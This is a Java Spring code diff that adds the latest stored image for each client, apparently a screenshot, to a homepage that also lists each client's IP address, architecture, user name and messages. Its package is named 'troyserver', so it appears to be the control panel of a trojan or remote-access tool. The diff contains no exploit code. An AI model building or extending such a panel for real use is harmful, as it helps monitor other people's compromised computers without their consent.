@@ -3,6 +3,7 @@ package ch.lebois.troyserver.controller;
 import ch.lebois.troyserver.data.entity.Client;
 import ch.lebois.troyserver.data.entity.Message;
 import ch.lebois.troyserver.data.repository.ClientRepository;
+import ch.lebois.troyserver.data.repository.ImageRepository;
 import ch.lebois.troyserver.data.repository.MessageRepository;
 import ch.lebois.troyserver.model.HomepageModel;
 import ch.lebois.troyserver.service.CookieService;
@@ -25,12 +26,14 @@ public class HomepageController {
     private CookieService cookieService;
     private ClientRepository clientRepository;
     private MessageRepository messageRepository;
+    private ImageRepository imageRepository;
 
     public HomepageController(CookieService cookieService, ClientRepository clientRepository,
-                              MessageRepository messageRepository) {
+                              MessageRepository messageRepository, ImageRepository imageRepository) {
         this.cookieService = cookieService;
         this.clientRepository = clientRepository;
         this.messageRepository = messageRepository;
+        this.imageRepository = imageRepository;
     }
 
     @RequestMapping(method = RequestMethod.GET)
@@ -62,6 +65,11 @@ public class HomepageController {
         homepageModel.setArch(client.getArch());
         homepageModel.setIp(client.getIp());
         homepageModel.setPcuser(client.getPcuser());
+        try {
+            homepageModel.setImg(imageRepository.findImagesByPcNameFkOrderByNameDesc(client.getPcName()).get(0).getName());
+        } catch (IndexOutOfBoundsException e) {
+            homepageModel.setImg("none");
+        }
 
         for (Message m : messageRepository.findAll()) {
             if (m.getPcNameFk().equals(client.getPcName())) {
